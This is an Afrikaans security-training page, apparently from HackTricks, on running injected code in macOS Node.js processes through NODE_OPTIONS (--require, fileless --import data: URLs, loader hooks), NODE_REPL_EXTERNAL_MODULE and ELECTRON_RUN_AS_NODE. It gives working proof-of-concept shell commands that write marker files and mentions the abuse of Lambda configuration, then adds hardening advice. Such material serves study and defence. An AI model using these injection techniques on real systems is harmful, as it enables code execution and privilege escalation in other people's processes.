# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

As 'n aanvaller die omgewing van 'n proses kan beheer wat uiteindelik **Node.js** begin (die `node`-binary direk, of enige Node-gebaseerde CLI soos `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), laat verskeie omgewingsveranderlikes die runtime **aanvaller-beheerde JavaScript laai en uitvoer voordat die teikenprogram loop**. Dit is 'n code-execution-primitief wat gelykstaande is aan die `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS`-families vir ander runtimes.

Die voorafgelaaide code loop **in dieselfde proses** met dieselfde uid, omgewing, file descriptors en entitlements as die slagoffer, dus is dit 'n skoon injection/priv-esc-vektor wanneer 'n meer bevoorregte proses Node begin met 'n geërfde of aanvaller-beïnvloede omgewing.

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS` word ontleed asof die inhoud daarvan ekstra command-line flags is. `--require` (`-r`) laai 'n CommonJS-module vooraf **voor** die entry point, sodat die top-level code eerste loop.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` met ’n `data:` URL (fileless)

Sedert **Node 20.6** aanvaar `--import` ’n `data:text/javascript,<code>` URL, wat jou toelaat om ES-module JavaScript **inline te preload**, sonder ’n lêer op die skyf en sonder ’n module-gids. Die kode moet **volledig URL-encoded** wees (’n rou spasie of `#` verkort die data URL en veroorsaak ’n `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Dit is die tegniek wat in die cloud misbruik word, byvoorbeeld deur `NODE_OPTIONS` in 'n AWS Lambda-funksie se konfigurasie in te spuit (`lambda:UpdateFunctionConfiguration`, geen `iam:PassRole` word vereis nie) om kode as die execution role uit te voer.

> [!TIP]
> `NODE_OPTIONS` **kan nie kode direk uitvoer nie**: vlae soos `--eval`/`-e`, `-p` of 'n skrippad word uitdruklik verwerp (`node: --eval is not allowed in NODE_OPTIONS`). Gebruik `--require`/`--import` om eerder na kode te wys.

## `NODE_OPTIONS` — custom loaders / ander opstartvlae

`NODE_OPTIONS` respekteer ook ander opstartvlae wat opstart beïnvloed en waarvan die newe-effek is dat aanvallerkode uitgevoer word, byvoorbeeld 'n ESM loader hook:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Enige Node-gebaseerde launcher wat ’n child `node` spawn, **propagateer gewoonlik `NODE_OPTIONS`**, sodat die inspuiting eenmalig ’n hele toolchain kan beïnvloed (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Wanneer Node ’n **interaktiewe REPL** begin, laai dit die module wat deur `NODE_REPL_EXTERNAL_MODULE` gespesifiseer word en voer die topvlak-kode daarvan uit. Dit is nuttig wanneer die slagoffer ’n interaktiewe `node`-/`node -i`-shell begin (dev tooling, maintenance consoles).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` word doelbewus **geïgnoreer** wanneer `kDisableNodeOptionsEnv`-beskerming gebruik word om 'n child te spawn, maar 'n interactive REPL wat direk gelanseer word, respekteer dit.

## Electron (`ELECTRON_RUN_AS_NODE`)

Electron-toepassings stel die volledige Node runtime weer bloot wanneer dit met **`ELECTRON_RUN_AS_NODE=1`** gestart word, waarna al die `NODE_OPTIONS`-vectors hierbo op die (dikwels signed/entitled) Electron-binary van toepassing is. Sien:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Ander JS runtimes

- **Bun** lees `NODE_OPTIONS` vir compatibility en ondersteun sy eie `--preload` (konfigureerbaar deur `bunfig.toml`).
- **Deno** respekteer nie `NODE_OPTIONS` nie; dit vereis eerder eksplisiete flags (`--import`, `--preload`), dus is dit nie kwesbaar vir 'n geërfde `NODE_OPTIONS` nie.

Bevestig altyd die presiese runtime en weergawe, aangesien die aanvaarbare flags tussen releases verander.

## Hardening

- Verwyder `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` en `ELECTRON_RUN_AS_NODE` uit die environment voordat Node vanuit 'n meer privileged context gelanseer word; spawn children met 'n sanitized environment.
- Behandel die vermoë om 'n target se environment te stel (config injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI variables, Lambda/container config) as equivalent aan code execution in enige Node process wat dit launch.
- Monitor process exec vir hierdie variables op dieselfde manier as wat [Shield](https://github.com/theevilbit/Shield) waarskuwings oor `ELECTRON_RUN_AS_NODE` en dyld injection variables genereer.

## References

- [1] [Node.js CLI-dokumentasie — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` en `data:` URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
